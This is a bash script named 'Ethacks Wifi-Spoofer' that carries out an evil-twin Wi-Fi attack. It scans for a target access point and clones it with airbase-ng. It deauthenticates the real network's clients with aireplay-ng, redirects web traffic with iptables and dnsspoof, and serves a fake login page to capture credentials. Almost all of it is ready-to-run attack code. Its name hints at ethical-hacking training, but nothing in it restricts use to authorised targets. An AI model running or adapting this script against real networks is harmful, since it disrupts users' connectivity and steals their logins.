#!/bin/bash

echo Starting Ethacks Wifi-Spoofer

BSSID=$1
CHANNEL=$2
ESSID=$3

# Setup monitor mode
airmon-ng check kill
/etc/init.d/avahi-daemon stop
airmon-ng start wlan0

# Find an access point to attack
# Find a way to grab the output of this command and feed next command
# Optionally have 2 separate bash scripts

# If there's no command line args then we airodump to find a BSSID to spoof
if [ -z "$BSSID"  ] || [ -z "$CHANNEL"  ] || [ -z "$ESSID"  ]
then
	echo No AP information entered. Starting airodump.
	echo Please ctrl+c once you have found the desired BSSID, Channel, and ESSID to spoof.
	sleep 3
	airodump-ng -a wlan0mon
	echo Please enter the desired BSSID to spoof:
	read BSSID
	echo Please enter the channel:
	read CHANNEL
	echo Please enter the ESSID:
	read ESSID
fi

# Spoof the chosen AP
airbase-ng -a $BSSID -c $CHANNEL -e $ESSID wlan0mon &

# Save PID 
AIRBASE_NG=$!

# Boost our signal strength (may not work)
iwconfig wlan0mon txpower 27

# Allocate subnet mask
ifconfig at0 10.0.0.1 up

# Enable NAT
iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup DHCP
dnsmasq -C dnsmasq.conf -d &

DNSMASQ=$!

# Start a webserver to host the fake auth page
# where fakeap/index.html is the fake login page
python3 -m http.server -d fakeap 80 &

PYTHON_P=$!

# Deauth all clients
aireplay-ng --deauth 1 -a $BSSID wlan0mon

# Redirect client to fake auth page
dnsspoof -i at1 &

echo Press [ENTER] to kill all the background processes and end the program.

read WAIT

kill $AIRBASE_NG
kill $DNSMASQ
kill $PYTHON_P

